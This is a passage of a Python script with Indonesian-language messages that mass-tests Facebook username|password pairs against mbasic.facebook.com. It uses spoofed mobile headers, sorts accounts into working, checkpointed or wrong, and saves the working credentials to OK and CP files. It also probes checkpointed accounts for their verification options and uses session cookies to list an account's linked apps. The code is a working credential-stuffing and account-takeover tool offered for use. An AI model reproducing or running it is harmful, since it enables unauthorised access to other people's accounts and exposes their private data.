		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1

# OPSI CEKER
def cek_opsi():
	c = len(akun)
	print ('[*] Terdapat %s Akun Untuk Dicek'%(c))
	input(x+'['+h+'•'+x+'] Mulai')
	print('\n[•] Proses Dimulai')
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s×× %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s×%s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s+ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s√%s|%s --> OK       %s'%(h,id,pw,x))
			else:
				print('\r%sa× %s|%s --> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			print('× Koneksi Internet Error')
			exit()
	print('✓ Selesai')
	exit()
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		#print('\n\r[*]Aplikasi Aktif :\n')
		for i in range(len(game)):
			#print(" \r[•] Aplikasi Aktif :")
			print ("\r        %s%s %s%s"%(x,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s! cookie invalid"%(N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		#print('\n\r[*]Aplikasi Kadaluwarsa:\n')
		for i in range(len(game)):
			#print("\rAplikasi Kadaluwarsa : ")
			print ("\r        %s%s %s%s"%(M,i+1,N,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))	

if __name__=='__main__':
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('OK')
	except:pass
	login()

